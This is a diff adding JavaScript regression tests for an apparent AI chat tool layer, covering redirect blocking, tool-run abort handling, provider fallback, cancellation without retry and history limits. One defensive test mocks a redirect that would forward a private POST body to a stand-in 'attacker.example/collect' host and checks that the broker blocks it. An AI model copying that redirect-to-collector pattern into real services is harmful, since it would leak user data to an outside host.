@@ -606,3 +606,97 @@ describe('buildApiMessages', () => {
         ]);
     });
 });
+
+describe('Android turn ownership and network regression cases', () => {
+    beforeEach(() => {
+        vi.clearAllMocks();
+        state.isGenerating = false;
+        state.generationDepth = 0;
+        state.abortController = null;
+        state.settings = { apiUrl: 'http://localhost:1234/v1', model: 'local', maxContext: 5, semanticRetrieval: false };
+        document.body.innerHTML = '<input id="chat-input"><div id="tools-dropdown"></div>';
+        window.showToast = vi.fn();
+    });
+    afterEach(() => {
+        state.isGenerating = false;
+        state.generationDepth = 0;
+        state.abortController = null;
+        server.resetHandlers();
+        vi.restoreAllMocks();
+    });
+
+    it('rejects redirects before forwarding an approved POST to another host', async () => {
+        let forwarded = 0;
+        server.use(
+            http.post('https://api.example.com/redirect', () => new HttpResponse(null, {
+                status: 307, headers: { Location: 'https://attacker.example/collect' }
+            })),
+            http.post('https://attacker.example/collect', () => { forwarded++; return HttpResponse.text('stolen'); })
+        );
+        const result = await tools.brokerToolFetch({ chatHistory: [] }, {
+            name: 'Scoped.js', allowedOrigins: ['https://api.example.com']
+        }, { url: 'https://api.example.com/redirect', method: 'POST', body: 'private-data' });
+        expect(result.ok).toBe(false);
+        expect(forwarded).toBe(0);
+    });
+
+    it('owns manual tool execution immediately, blocks duplicate sends, and stops before the next tool/provider', async () => {
+        const { fakeRunSandboxedTool } = await import('./helpers/fakeToolSandbox.js');
+        let finishTool;
+        fakeRunSandboxedTool.mockImplementationOnce(() => new Promise(resolve => { finishTool = resolve; }));
+        const aspect = { id: 'owner', name: 'Owner', chatHistory: [], tools: [
+            trustedTool('First', 'async function executeTool() { return 1; }'),
+            trustedTool('Second', 'async function executeTool() { return 2; }')
+        ] };
+        aspectsModule.getCurrentAspect.mockReturnValue(aspect);
+        const fetch = vi.spyOn(globalThis, 'fetch');
+        const input = document.getElementById('chat-input');
+        input.value = '[Run Tool: First] [Run Tool: Second]';
+        const turn = tools.sendMessage();
+        expect(state.isGenerating).toBe(true);
+        expect(state.abortController.signal.aborted).toBe(false);
+        expect(fakeRunSandboxedTool).toHaveBeenCalledTimes(1);
+        input.value = 'second send';
+        await tools.sendMessage();
+        expect(input.value).toBe('second send');
+        expect(aspect.chatHistory.filter(message => message.role === 'user')).toHaveLength(1);
+        tools.abortAIRequest();
+        finishTool({ result: 'late', state: { late: true } });
+        await turn;
+        expect(fakeRunSandboxedTool).toHaveBeenCalledTimes(1);
+        expect(aspect.tools[0].state).toEqual({});
+        expect(fetch).not.toHaveBeenCalled();
+        expect(state.isGenerating).toBe(false);
+        expect(state.generationDepth).toBe(0);
+        expect(state.abortController).toBeNull();
+        expect(aspect.chatHistory.some(message => /stopped by user/.test(message.content))).toBe(true);
+    });
+
+    it('uses a configured fallback when a summon primary is empty', async () => {
+        state.settings = { apiUrl: '', fallbackProvider: 'custom', fallbackUrl: 'http://localhost:1234/v1', fallbackModel: 'local' };
+        server.use(http.post('http://localhost:1234/v1/chat/completions', () => HttpResponse.json({
+            choices: [{ message: { content: 'fallback answer' } }]
+        })));
+        await expect(tools.fetchAIResponseForAspect({ id: 'summon', instructions: '' }, 'question')).resolves.toBe('fallback answer');
+    });
+
+    it('does not retry a summon when cancellation produces a generic transport failure', async () => {
+        const controller = new AbortController();
+        const fetch = vi.spyOn(globalThis, 'fetch').mockImplementationOnce(() => {
+            controller.abort();
+            return Promise.reject(new TypeError('connection closed'));
+        });
+        state.settings.fallbackProvider = 'custom';
+        state.settings.fallbackUrl = 'http://localhost:8080/v1';
+        await expect(tools.fetchAIResponseForAspect({ id: 'summon' }, 'question', controller.signal)).rejects.toThrow();
+        expect(fetch).toHaveBeenCalledTimes(1);
+    });
+
+    it.each([0, -10, Infinity, NaN])('bounds history count %s at the request boundary', value => {
+        const messages = Array.from({ length: 30 }, (_, i) => ({ role: 'user', content: String(i) }));
+        const result = tools.buildApiMessages({ chatHistory: messages }, 'system', '', value);
+        expect(result.length).toBeGreaterThan(1);
+        expect(result.length).toBeLessThanOrEqual(21);
+        expect(result.at(-1).content).toBe('29');
+    });
+});
